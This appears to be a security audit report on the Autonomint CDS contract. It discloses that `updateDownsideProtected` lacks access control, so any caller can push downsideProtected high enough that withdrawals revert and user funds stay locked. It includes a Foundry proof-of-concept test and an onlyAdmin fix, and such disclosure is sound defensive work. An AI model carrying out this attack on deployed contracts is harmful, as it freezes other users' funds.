# CDS::updateDownsideProtected has no access controls and will permanently lock user funds

### Summary

`CDS::updateDownsideProtected` has no access controls and subtractions are done in both deposit and withdraw functions, so anyone can set downsideProtected to uint128.max and lock funds after users deposit in CDS. `CDS::_updateCurrentTotalCdsDepositedAmount` is called in both deposit and withdraw functions, and totalCdsDepositedAmount - downsideProtected will always revert in underflow since downsideProtected is set to uint128.max, this calculation happens in the `_updateCurrentTotalCdsDepositedAmount` function.

[CDS::_updateCurrentTotalCdsDepositedAmount](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L833)

### Root Cause

`CDS::updateDownsideProtected` has no access controls, so anyone can update downsideProtected.

### Internal pre-conditions

- User updates downsideProtected to uint128.max
- User deposits in CDS
- User withdraws from CDS

### External pre-conditions

None

### Attack Path

1. Users deposit in CDS
2. Malicious actor updates downsideProtected to uint128.max
3. Users attempt to withdraw from CDS
4. Withdrawals revert in underflow because of `_updateCurrentTotalCdsDepositedAmount` and since downsideProtected is set to uint128.max
5. Users funds are locked in CDS

### Impact

User funds will be locked in CDS since withdrawals will always revert in underflow.

### PoC

- Insert the PoC in `borrowing.t.sol`
- Run the test with `forge test --fork-url http://127.0.0.1:8545 --mt testUserCanChangeDownsideProtectedAndPermanentlyLockFunds -vvvv`

```javascript
function testUserCanChangeDownsideProtectedAndPermanentlyLockFunds() public {
        // User deposits USDT in CDS
        vm.startPrank(USER);
        contractsA.usdt.mint(address(USER),5000000000);
        uint256 usdtBalance = contractsA.usdt.balanceOf(address(USER));
        contractsA.usdt.approve(address(contractsA.cds),usdtBalance);
        contractsA.cds.deposit{value: globalFee.nativeFee}(uint128(usdtBalance),0,true,uint128(usdtBalance), ETH_PRICE);

        // Malicious actor changes downsideProtected to max
        vm.startPrank(USER);
        contractsA.cds.updateDownsideProtected(type(uint128).max);
        vm.stopPrank();

        // User tries to withdraw USDT deposited in CDS
        vm.startPrank(USER);
        vm.expectRevert(); // will underflow since downsideProtected is set to max
        contractsA.cds.withdraw{value: globalFee3.nativeFee}(1,1000e3,0,1,"0x");
        vm.stopPrank();
    }
```

### Mitigation

- Add onlyAdmin modifier to `CDS::updateDownsideProtected`

```diff
+   function updateDownsideProtected(uint128 downsideProtectedAmount) external onlyAdmin {
        downsideProtected += downsideProtectedAmount;
    }
```
